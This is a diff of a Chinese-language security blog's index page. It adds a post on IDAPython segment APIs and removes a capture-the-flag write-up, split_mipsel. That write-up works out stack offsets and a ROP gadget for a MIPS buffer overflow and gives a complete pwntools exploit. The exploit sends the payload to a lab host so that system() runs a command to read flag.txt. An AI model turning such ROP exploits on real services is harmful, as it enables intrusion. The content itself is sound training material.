@@ -168,6 +168,129 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E6%AE%B5%E7%B2%92%E5%BA%A6/" class="post-title-link" itemprop="url">IDAPython-段粒度</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-06 01:19:48" itemprop="dateCreated datePublished" datetime="2023-04-06T01:19:48+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 13:48:03" itemprop="dateModified" datetime="2023-04-11T13:48:03+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>简单说明了IDA的反汇编输出窗口内容、如何使用IDAPython对单条指令进行简单分析。后续的笔记将先分别从段（segment）、函数（function）、块（block）、指令（instruction）多个粒度，对IDAPython经常使用到的数据结构和函数API进行说明，然后再到分析必不可少的交叉引用（cross-references）和数据搜索（searching for code or data）。</p>
+<h2 id="segment的基本操作"><a href="#segment的基本操作" class="headerlink" title="segment的基本操作"></a>segment的基本操作</h2><p>如下是对段（segments）进行一些基本的操作。<code>idautils.Segments()</code>会返回一个迭代器，可以使用循环遍历当前文件的所有段对象。对于每一个段对象可以使用<code>idc.get_segm_name</code>获取段名、<code>idc.get_segm_start</code>获取段起始地址、<code>idc.get_segm_end</code>获取段的结束地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    <span class="built_in">print</span>(idc.get_segm_name(seg), idc.get_segm_start(seg), idc.get_segm_end(seg))</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LOAD 4194304 4194568</span></span><br><span class="line"><span class="string">REGINFO 4194568 4194592</span></span><br><span class="line"><span class="string">LOAD 4194592 4216248</span></span><br><span class="line"><span class="string">.init 4216248 4216384</span></span><br><span class="line"><span class="string">.text 4216384 4649072</span></span><br><span class="line"><span class="string">.MIPS.stubs 4649072 4651008</span></span><br><span class="line"><span class="string">.fini 4651008 4651096</span></span><br><span class="line"><span class="string">LOAD 4651096 4651104</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在实际的代码中，有时候需要对当前地址<code>ea</code>所在的段进行分析。<code>idc.get_segm_start(ea)</code>和<code>idc.get_segm_end(ea)</code>分别可以获取到地址<code>ea</code>所在的段的起始地址和结束地址；<code>idc.get_next_seg(ea)</code>可以获取到<code>ea</code>所在段的下一个段起始地址，然后没有找到对应的寻找上一个段起始地址的API。使用<code>idc.get_segm_name(ea)</code>则可以获取到当前地址<code>ea</code>所在段的段名。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;idc.get_segm_start(ea)</span><br><span class="line"><span class="number">0x400120</span></span><br><span class="line">Python&gt;idc.get_segm_end(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_next_seg(ea)</span><br><span class="line"><span class="number">0x46f8f8</span></span><br><span class="line">Python&gt;idc.get_segm_name(ea)</span><br><span class="line"><span class="string">&#x27;.text&#x27;</span></span><br><span class="line">Python&gt;idc.get_segm_name(<span class="number">0x46f8f8</span>)</span><br><span class="line"><span class="string">&#x27;.fini&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>同样的，也可以根据段名来获取到段相关属性：<code>idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</code>。需要首先使用<code>idc.selector_by_name(str_SectionName)</code>获取到段名为<code>str_SectionName</code>的段选择器（selector），然后使用<code>idc.get_segm_by_sel()</code>来获取到段的起始地址。如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;str_SectionName = <span class="string">&quot;.text&quot;</span></span><br><span class="line">Python&gt;idc.get_segm_by_sel(idc.selector_by_name(str_SectionName))</span><br><span class="line"><span class="number">0x400120</span></span><br></pre></td></tr></table></figure>
+<h2 id="idc模块中常用的段操作函数"><a href="#idc模块中常用的段操作函数" class="headerlink" title="idc模块中常用的段操作函数"></a>idc模块中常用的段操作函数</h2><table>
+<thead>
+<tr>
+<th>api</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>get_segm_attr(segea, attr)</td>
+<td>根据段中的地址segea获取段的attr属性</td>
+</tr>
+<tr>
+<td>get_segm_start(ea)</td>
+<td>获取段起始地址</td>
+</tr>
+<tr>
+<td>get_segm_end(ea)</td>
+<td>获取段结束地址</td>
+</tr>
+<tr>
+<td>get_segm_name(ea)</td>
+<td>获取段名</td>
+</tr>
+</tbody></table>
+<h2 id="包含更多段操作的模块：ida-segment"><a href="#包含更多段操作的模块：ida-segment" class="headerlink" title="包含更多段操作的模块：ida_segment"></a>包含更多段操作的模块：ida_segment</h2><p><code>idc</code>模块中对段的操作实际上是对<code>ida_segment</code>模块中函数的封装，在<code>ida_segment</code>模块中还有更多段的数据结构和方法，例如：</p>
+<ul>
+<li>新增段：<code>add_segm</code></li>
+<li>删除段：<code>del_segm</code></li>
+<li>根据段名获取段：<code>get_segm_by_name</code></li>
+<li>根据当前地址获取段名：<code>get_segm_name</code></li>
+<li>设置段名：<code>set_segm_name</code></li>
+<li>设置段的起始地址：<code>set_segm_start</code>、<code>set_segm_end</code></li>
+<li>……</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/idc.html">idc API documentation</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hex-rays.com/products/ida/support/idapython_docs/ida_segment.html">ida_segment API documentation</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1022,95 +1145,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/split_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/split_mipsel/" class="post-title-link" itemprop="url">split_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:11:51" itemprop="dateCreated datePublished" datetime="2023-03-15T10:11:51+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:37" itemprop="dateModified" datetime="2023-04-11T13:57:37+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这道题目的本质是如何让ROP去执行system，同时将命令&#x2F;bin&#x2F;cat flag.txt的地址传递给system函数。<br>漏洞的溢出点还是非常简单，缓冲区位于：sp+18h，ra中的函数返回地址保存在：sp + 3ch，填充24h个数据后，开始覆盖掉返回地址。<br>那么需要找个一个gadget可以控制a0寄存器，随后可以执行到system函数，非常巧的是，在该题目ELF中塞入了一个这样的gadget：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A20                               usefulGadgets:</span><br><span class="line">.text:00400A20 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:00400A24 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400A28 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400A2C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
-<p>此时的问题就是如何控制命令地址和system函数的地址分别到sp+8和sp+4上。<br>当控制流被劫持的时候，此时sp已经完成了堆栈平衡，此时的sp相对溢出缓冲区起始地址的距离是40h-18h&#x3D;28h，那么可以将命令地址和system函数地址布置到sp+8和sp+4，也就是相对溢出缓冲区28h+8和28h+4的位置，小结如下：</p>
-<p>相对溢出缓冲区的布局：</p>
-<ul>
-<li>24h后的4个字节&#x3D;gadget位置，写完了28h个字节</li>
-<li>28h+4&#x3D;2ch后的4个字节&#x3D;system函数地址，写完了30h个字节</li>
-<li>28h+8&#x3D;30h后的4个字节&#x3D;&#x2F;bin&#x2F;cat&#x2F; flag.txt的地址<br>中间无用的数据使用任意字节填充，得到ROP如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00400A20</span>) <span class="comment"># gadget</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">rop += p32(<span class="number">0x004110CC</span>)</span><br><span class="line">rop += p32(<span class="number">0x00411010</span>)</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./split_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00400A20</span>)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411010</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(rop)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>#qu gdb运行到分支、运行到函数返回</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1180,7 +1214,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-count">55</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
